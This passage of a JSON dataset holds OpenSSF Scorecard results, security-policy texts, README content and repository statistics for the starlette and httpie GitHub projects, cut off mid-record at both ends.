                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/encode/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/encode/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/publish.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/test-suite.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/encode/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nIf you think you have identified a security issue with an Encode project, **do not open a public issue**.\n\nTo responsibly report a security issue, please navigate to the Security tab for the repo and click \"Report a vulnerability.\"\n\n![Screenshot of repo security tab showing \"Report a vulnerability\" button](https://github.com/encode/.github/raw/master/img/github-demos-private-vulnerability-reporting.png)\n\nBe sure to include as much detail as necessary in your report. As with reporting normal issues, a minimal reproducible example will help the maintainers address the issue faster.\n\nThank you.\n",
        "project_all_labels": [
            "authentication",
            "bug",
            "clean up",
            "cors",
            "dependencies",
            "documentation",
            "feature",
            "github_actions",
            "good first issue",
            "help wanted",
            "hold",
            "maintenance",
            "multipart",
            "need confirmation",
            "outdated",
            "python",
            "refactor",
            "sessions",
            "staticfiles",
            "testclient",
            "typing",
            "websocket"
        ],
        "README_content": "<p align=\"center\">\n  <a href=\"https://www.starlette.io/\"><img width=\"420px\" src=\"https://raw.githubusercontent.com/encode/starlette/master/docs/img/starlette.svg\" alt='starlette'></a>\n</p>\n<p align=\"center\">\n    <em>✨ The little ASGI framework that shines. ✨</em>\n</p>\n\n---\n\n[![Build Status](https://github.com/encode/starlette/workflows/Test%20Suite/badge.svg)](https://github.com/encode/starlette/actions)\n[![Package version](https://badge.fury.io/py/starlette.svg)](https://pypi.python.org/pypi/starlette)\n[![Supported Python Version](https://img.shields.io/pypi/pyversions/starlette.svg?color=%2334D058)](https://pypi.org/project/starlette)\n\n---\n\n**Documentation**: <a href=\"https://www.starlette.io/\" target=\"_blank\">https://www.starlette.io</a>\n\n**Source Code**: <a href=\"https://github.com/encode/starlette\" target=\"_blank\">https://github.com/encode/starlette</a>\n\n---\n\n# Starlette\n\nStarlette is a lightweight [ASGI][asgi] framework/toolkit,\nwhich is ideal for building async web services in Python.\n\nIt is production-ready, and gives you the following:\n\n* A lightweight, low-complexity HTTP web framework.\n* WebSocket support.\n* In-process background tasks.\n* Startup and shutdown events.\n* Test client built on `httpx`.\n* CORS, GZip, Static Files, Streaming responses.\n* Session and Cookie support.\n* 100% test coverage.\n* 100% type annotated codebase.\n* Few hard dependencies.\n* Compatible with `asyncio` and `trio` backends.\n* Great overall performance [against independent benchmarks][techempower].\n\n## Installation\n\n```shell\n$ pip install starlette\n```\n\nYou'll also want to install an ASGI server, such as [uvicorn](https://www.uvicorn.org/), [daphne](https://github.com/django/daphne/), or [hypercorn](https://hypercorn.readthedocs.io/en/latest/).\n\n```shell\n$ pip install uvicorn\n```\n\n## Example\n\n```python title=\"example.py\"\nfrom starlette.applications import Starlette\nfrom starlette.responses import JSONResponse\nfrom starlette.routing import Route\n\n\nasync def homepage(request):\n    return JSONResponse({'hello': 'world'})\n\nroutes = [\n    Route(\"/\", endpoint=homepage)\n]\n\napp = Starlette(debug=True, routes=routes)\n```\n\nThen run the application using Uvicorn:\n\n```shell\n$ uvicorn example:app\n```\n\nFor a more complete example, see [encode/starlette-example](https://github.com/encode/starlette-example).\n\n## Dependencies\n\nStarlette only requires `anyio`, and the following are optional:\n\n* [`httpx`][httpx] - Required if you want to use the `TestClient`.\n* [`jinja2`][jinja2] - Required if you want to use `Jinja2Templates`.\n* [`python-multipart`][python-multipart] - Required if you want to support form parsing, with `request.form()`.\n* [`itsdangerous`][itsdangerous] - Required for `SessionMiddleware` support.\n* [`pyyaml`][pyyaml] - Required for `SchemaGenerator` support.\n\nYou can install all of these with `pip install starlette[full]`.\n\n## Framework or Toolkit\n\nStarlette is designed to be used either as a complete framework, or as\nan ASGI toolkit. You can use any of its components independently.\n\n```python\nfrom starlette.responses import PlainTextResponse\n\n\nasync def app(scope, receive, send):\n    assert scope['type'] == 'http'\n    response = PlainTextResponse('Hello, world!')\n    await response(scope, receive, send)\n```\n\nRun the `app` application in `example.py`:\n\n```shell\n$ uvicorn example:app\nINFO: Started server process [11509]\nINFO: Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)\n```\n\nRun uvicorn with `--reload` to enable auto-reloading on code changes.\n\n## Modularity\n\nThe modularity that Starlette is designed on promotes building re-usable\ncomponents that can be shared between any ASGI framework. This should enable\nan ecosystem of shared middleware and mountable applications.\n\nThe clean API separation also means it's easier to understand each component\nin isolation.\n\n---\n\n<p align=\"center\"><i>Starlette is <a href=\"https://github.com/encode/starlette/blob/master/LICENSE.md\">BSD licensed</a> code.<br/>Designed & crafted with care.</i></br>&mdash; ⭐️ &mdash;</p>\n\n[asgi]: https://asgi.readthedocs.io/en/latest/\n[httpx]: https://www.python-httpx.org/\n[jinja2]: https://jinja.palletsprojects.com/\n[python-multipart]: https://andrew-d.github.io/python-multipart/\n[itsdangerous]: https://itsdangerous.palletsprojects.com/\n[sqlalchemy]: https://www.sqlalchemy.org\n[pyyaml]: https://pyyaml.org/wiki/PyYAMLDocumentation\n[techempower]: https://www.techempower.com/benchmarks/#hw=ph&test=fortune&l=zijzen-sf\n",
        "num_commits": 1393,
        "project_age_days": 2318,
        "project_created_at": "2018-06-25",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-27",
        "num_contributors": 268,
        "num_pull": 1546,
        "num_issues": 2273,
        "num_opening_issue": 45,
        "project_size(kB)": 6852,
        "num_stargazers": 10210,
        "num_watchers": 10210,
        "num_forks": 930,
        "num_subscribers": 104,
        "SecurityPolicy_created_at": "2022-10-12 12:43:13",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "840a9cb04c6f3d10055bce4edb0556b8f9f4e9e2",
                "url": "https://github.com/encode/.github/commit/840a9cb04c6f3d10055bce4edb0556b8f9f4e9e2",
                "date": "2022-11-10 11:09:02"
            },
            {
                "commit_id": "8e64dd8bc3a301ab9d3fb781999a73a19b8e1e0e",
                "url": "https://github.com/encode/.github/commit/8e64dd8bc3a301ab9d3fb781999a73a19b8e1e0e",
                "date": "2022-11-09 23:04:48"
            },
            {
                "commit_id": "52104479ca18941a2534c1f2c01fcb3f882f4c8b",
                "url": "https://github.com/encode/.github/commit/52104479ca18941a2534c1f2c01fcb3f882f4c8b",
                "date": "2022-11-09 23:03:11"
            },
            {
                "commit_id": "4cf4a5641643c199ded67af6c5c061752244a851",
                "url": "https://github.com/encode/.github/commit/4cf4a5641643c199ded67af6c5c061752244a851",
                "date": "2022-10-12 12:43:13"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "advisory",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "httpie/httpie",
        "project_url": "https://github.com/httpie/httpie",
        "SSF": {
            "date": "2024-10-30T00:19:23+07:00",
            "repo": {
                "name": "github.com/httpie/httpie",
                "commit": "50e1564600eaca3ff99ffd7a7f707f564da3af48"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.6,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Warn: branch protection not enabled for branch 'master'"
                    ],
                    "score": 0,
                    "reason": "branch protection not enabled on development/release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 3,
                    "reason": "5 out of 14 merged PRs checked by a CI test -- score normalized to 3",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 3,
                    "reason": "Found 9/26 approved changesets -- score normalized to 3",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: LinuxDays contributor org/company found, red hat fit ctu contributor org/company found, reizio contributor org/company found, conda-forge contributor org/company found, betamaxpy contributor org/company found, jupyterlab contributor org/company found, python-organizers contributor org/company found, python contributor org/company found, sclorg contributor org/company found, admesh contributor org/company found, fedora-python contributor org/company found, pyldap contributor org/company found, slic3r contributor org/company found, hapijs contributor org/company found, nodesecurity contributor org/company found, adobe contributor org/company found, 3DprintFIT contributor org/company found, code4rena contributor org/company found, fal-ai contributor org/company found, jazzband contributor org/company found, pyvec contributor org/company found, cvut contributor org/company found, devassistant contributor org/company found, pytest-dev contributor org/company found, httpie contributor org/company found, fsspec contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 26 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 1,
                    "reason": "1 commit(s) and 1 issue activity found in the last 90 days -- score normalized to 1",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/benchmark.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/benchmark.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/benchmark.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/benchmark.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/benchmark.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/benchmark.yml:50: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/code-style.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/code-style.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/code-style.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/code-style.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/content.yml:10: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/content.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/content.yml:11: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/content.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/content.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/content.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/coverage.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/coverage.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/coverage.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/coverage.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-check-markdown.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/docs-check-markdown.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docs-check-markdown.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/docs-check-markdown.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-brew.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-brew.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-brew.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-brew.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-choco.yml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-choco.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:23: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-linux-standalone.yml:70: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-linux-standalone.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pypi.yml:16: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-pypi.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-pypi.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-pypi.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-pypi.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-pypi.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release-snap.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-snap.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-snap.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-snap.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/release-snap.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/release-snap.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/stale.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/stale.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test-package-linux-snap.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/test-package-linux-snap.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test-package-linux-snap.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/test-package-linux-snap.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test-package-mac-brew.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/test-package-mac-brew.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/httpie/cli/tests.yml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: extras/packaging/linux/Dockerfile:3: pin your Docker image by updating ubuntu:18.04 to ubuntu:18.04@sha256:152dc042452c496007f07ca9127571cb9c29697f42acbfad72324b2bb2e43c98",
                        "Warn: pipCommand not pinned by hash: extras/packaging/linux/Dockerfile:26",
                        "Warn: pipCommand not pinned by hash: extras/packaging/linux/Dockerfile:27",
                        "Warn: pipCommand not pinned by hash: extras/packaging/linux/Dockerfile:28",
                        "Warn: pipCommand not pinned by hash: .github/workflows/benchmark.yml:24",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs-deploy.yml:21",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release-linux-standalone.yml:54",
                        "Info:   0 out of  26 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  10 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   1 containerImage dependencies pinned",
                        "Info:   0 out of   6 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 14 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact 3.2.2 not signed: https://api.github.com/repos/httpie/cli/releases/103665121",
                        "Warn: release artifact 3.2.1 not signed: https://api.github.com/repos/httpie/cli/releases/66196395",
                        "Warn: release artifact 3.2.0 not signed: https://api.github.com/repos/httpie/cli/releases/66163753",
                        "Warn: release artifact 3.1.0 not signed: https://api.github.com/repos/httpie/cli/releases/61214710",
                        "Warn: release artifact 3.2.2 does not have provenance: https://api.github.com/repos/httpie/cli/releases/103665121",
                        "Warn: release artifact 3.2.1 does not have provenance: https://api.github.com/repos/httpie/cli/releases/66196395",
                        "Warn: release artifact 3.2.0 does not have provenance: https://api.github.com/repos/httpie/cli/releases/66163753",
                        "Warn: release artifact 3.1.0 does not have provenance: https://api.github.com/repos/httpie/cli/releases/61214710"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/code-style.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/content.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/coverage.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docs-check-markdown.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docs-deploy.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-brew.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-choco.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-linux-standalone.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-pypi.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release-snap.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/test-package-linux-snap.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/test-package-mac-brew.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/tests.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/httpie/httpie/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security policy\n\n## Reporting a vulnerability\n\nWhen you identify a vulnerability in HTTPie, please report it privately using one of the following channels:\n\n- Email to [`security@httpie.io`](mailto:security@httpie.io)\n- Report on [huntr.dev](https://huntr.dev/)\n\nIn addition to the description of the vulnerability, include the following information:\n\n- A short reproducer to verify it (it can be a small HTTP server, shell script, docker image, etc.)\n- Your deemed severity level of the vulnerability (`LOW`/`MEDIUM`/`HIGH`/`CRITICAL`)\n- [CWE](https://cwe.mitre.org/) ID, if available.\n",
        "project_all_labels": [
            "awaiting-response",
            "benchmark",
            "blocked by upstream",
            "bug",
            "cli",
            "deferred",
            "dependencies",
            "docs",
            "duplicate",
            "enhancement",
            "error-messages",
            "extensions",
            "good first issue",
            "help wanted",
            "invalid",
            "low-priority",
            "needs product design",
            "new",
            "not-a-bug",
            "packaging",
            "performance",
            "planned",
            "plugins",
            "project-structure",
            "question",
            "sessions",
            "stale",
            "testing",
            "website",
            "windows",
            "wontfix"
        ],
        "README_content": "<h2 align=\"center\">\n    <a href=\"https://httpie.io\" target=\"blank_\">\n        <img height=\"100\" alt=\"HTTPie\" src=\"https://raw.githubusercontent.com/httpie/cli/master/docs/httpie-logo.svg\" />\n    </a>\n    <br>\n    HTTPie CLI: human-friendly HTTP client for the API era\n</h2>\n\n<div align=\"center\">\n\n[![HTTPie for Desktop](https://img.shields.io/static/v1?label=HTTPie&message=Desktop&color=4B78E6)](https://httpie.io/product)\n[![](https://img.shields.io/static/v1?label=HTTPie&message=Web%20%26%20Mobile&color=73DC8C)](https://httpie.io/app)\n[![](https://img.shields.io/static/v1?label=HTTPie&message=CLI&color=FA9BFA)](https://httpie.io/cli)\n[![Twitter](https://img.shields.io/twitter/follow/httpie?style=flat&color=%234B78E6&logoColor=%234B78E6)](https://twitter.com/httpie)\n[![Chat](https://img.shields.io/discord/725351238698270761?style=flat&label=Chat%20on%20Discord&color=%23FA9BFA)](https://httpie.io/discord)\n\n</div>\n\n\n<div align=\"center\">\n\n[![Docs](https://img.shields.io/badge/stable%20docs-httpie.io%2Fdocs%2Fcli-brightgreen?style=flat&color=%2373DC8C&label=Docs)](https://httpie.org/docs/cli)\n[![Latest version](https://img.shields.io/pypi/v/httpie.svg?style=flat&label=Latest&color=%234B78E6&logo=&logoColor=white)](https://pypi.python.org/pypi/httpie)\n[![Build](https://img.shields.io/github/actions/workflow/status/httpie/cli/tests.yml?branch=master&color=%23FA9BFA&label=Build)](https://github.com/httpie/cli/actions)\n[![Coverage](https://img.shields.io/codecov/c/github/httpie/cli?style=flat&label=Coverage&color=%2373DC8C)](https://codecov.io/gh/httpie/cli)\n[![PyPi downloads](https://img.shields.io/pepy/dt/httpie?style=flat&label=Downloads%20from%20PyPi%20only&color=4B78E6)](https://www.pepy.tech/projects/httpie)\n\n</div>\n\nHTTPie (pronounced _aitch-tee-tee-pie_) is a command-line HTTP client.\nIts goal is to make CLI interaction with web services as human-friendly as possible.\nHTTPie is designed for testing, debugging, and generally interacting with APIs & HTTP servers.\nThe `http` & `https` commands allow for creating and sending arbitrary HTTP requests.\nThey use simple and natural syntax and provide formatted and colorized output.\n\n<div align=\"center\">\n\n<img src=\"https://raw.githubusercontent.com/httpie/cli/master/docs/httpie-animation.gif\" alt=\"HTTPie in action\" width=\"100%\"/>\n\n\n</div>\n\n\n\n\n## We lost 54k GitHub stars\n\nPlease note we recently accidentally made this repo private for a moment, and GitHub deleted our community that took a decade to build. Read the full story here: https://httpie.io/blog/stardust\n\n![](docs/stardust.png)\n\n\n## Getting started\n\n- [Installation instructions →](https://httpie.io/docs#installation)\n- [Full documentation →](https://httpie.io/docs)\n\n## 